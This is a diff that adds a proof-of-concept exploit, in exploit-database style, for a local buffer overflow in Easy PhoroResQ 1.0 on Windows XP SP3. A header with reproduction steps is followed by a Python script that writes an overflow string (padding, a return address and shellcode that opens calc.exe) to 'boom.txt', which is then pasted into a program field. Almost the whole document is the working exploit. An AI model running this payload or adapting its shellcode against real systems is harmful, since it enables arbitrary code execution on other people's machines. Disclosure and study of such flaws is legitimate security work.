@@ -1,0 +1,27 @@
+# Exploit Title: Easy PhoroResQ 1.0 - Buffer Overflow (PoC)
+# Discovery by: Cemal Cihad ÇİFTÇİ
+# Discovery Date: 2018-09-24
+# Tested Version: 1.0
+# Vulnerability Type: Local Buffer Overflow
+# Tested on OS: Windows XP Professional Service Pack 3
+# Vendor Homepage: http://www.easyphotoresq.com/
+# Download Link: http://www.easyphotoresq.com/download.html
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "boom.txt". Copy the content of the new file "boom.txt". 
+# Now start the program. Now when you are inside of the programwindow #click "File" > "Options". 
+# In the field: "Folder/filename" paste the copied #content from "boom.txt". 
+# Now click "OK" and calc.exe will appear.
+
+#!/usr/bin/python
+
+buffer = "A" * 1320 + "\xdf\x44\xc6\x4e" + "\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xD0"
+
+payload = buffer
+try:
+    f=open("boom.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
